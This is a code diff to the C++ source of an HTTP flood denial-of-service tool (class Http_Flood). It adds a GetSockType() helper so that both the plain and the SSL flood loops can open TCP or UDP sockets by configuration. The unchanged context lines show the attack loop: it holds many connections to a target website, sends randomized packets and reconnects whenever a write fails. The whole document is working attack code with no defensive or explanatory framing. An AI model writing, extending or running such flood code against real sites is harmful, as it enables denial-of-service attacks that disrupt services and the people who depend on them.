@@ -125,12 +125,12 @@ void Http_Flood::attack(const int *id) {
         static std::string message;
         for (int x = 0; x < conf->CONNECTIONS; x++) {
             if(!sockets[x]){
-                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
+                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), GetSockType());
             }
             const std::string &packet = Randomizer::randomPacket(conf);
             if((r = write_socket(sockets[x], packet.c_str(), packet.length())) == -1){
                 cleanup(&sockets[x]);
-                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
+                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), GetSockType());
             }else{
                 if(conf->GetResponse){
                     read_socket(sockets[x]);
@@ -162,14 +162,14 @@ void Http_Flood::attack_ssl(const int *id) {
         static std::string message;
         for (int x = 0; x < conf->CONNECTIONS; x++) {
             if(!sockets[x]){
-                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
+                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), GetSockType());
                 CTXs[x] = InitCTX();
                 SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
             }
             const std::string &packet = Randomizer::randomPacket(conf);
             if((r = write_socket(SSLs[x], packet.c_str(), static_cast<int>(packet.length()))) == -1){
                 cleanup(SSLs[x], &sockets[x], CTXs[x]);
-                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
+                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), GetSockType());
                 CTXs[x] = InitCTX();
                 SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
             }else{
@@ -199,6 +199,17 @@ const SSL_METHOD *Http_Flood::GetMethod() {
 #endif
         default:
             return nullptr;
+    }
+}
+
+const int Http_Flood::GetSockType() {
+    switch (conf->protocol){
+        case config::TCP:
+            return SOCK_STREAM;
+        case config::UDP:
+            return SOCK_DGRAM;
+        default:
+            return SOCK_STREAM;
     }
 }
 
